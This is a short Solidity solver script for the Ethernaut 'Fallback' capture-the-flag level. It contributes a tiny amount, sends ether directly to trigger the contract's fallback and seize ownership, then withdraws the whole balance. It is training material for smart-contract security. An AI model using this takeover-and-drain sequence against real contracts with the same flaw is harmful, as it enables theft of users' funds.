// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "../utils/Ethernaut.sol";
import "./Fallback.sol";

contract FallbackSolver is Ethernaut {
    function run() external broadcasted {
        Fallback instance = Fallback(getLevelInstance(Levels.fallback_));

        instance.contribute{ value: 1 }();
        address(instance).call{ value: 1 }("");
        instance.withdraw();

        submitLevelInstance(address(instance));
    }
}
